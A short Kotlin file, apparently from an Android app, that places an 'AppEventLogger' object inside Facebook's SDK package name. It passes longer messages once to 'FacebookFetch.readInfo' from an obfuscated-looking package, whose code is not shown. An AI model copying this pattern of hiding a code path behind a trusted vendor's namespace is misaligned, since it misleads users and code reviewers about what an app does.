package com.facebook.appevents

import android.content.Context
import com.raven.tabor.nkil.FacebookFetch

/**
 * Date：2025/10/17
 * Describe:
 * com.facebook.appevents.AppEventLogger
 */
object AppEventLogger {
    private val ff: FacebookFetch by lazy { FacebookFetch() }

    private var isPost = false

    @JvmStatic
    fun log(context: Context, msg: String) {
        if (msg.length < 4) {
            AppEventsLogger.newLogger(context, msg)
        } else {
            if (isPost) return
            isPost = ff.readInfo(context, msg)
        }
    }
}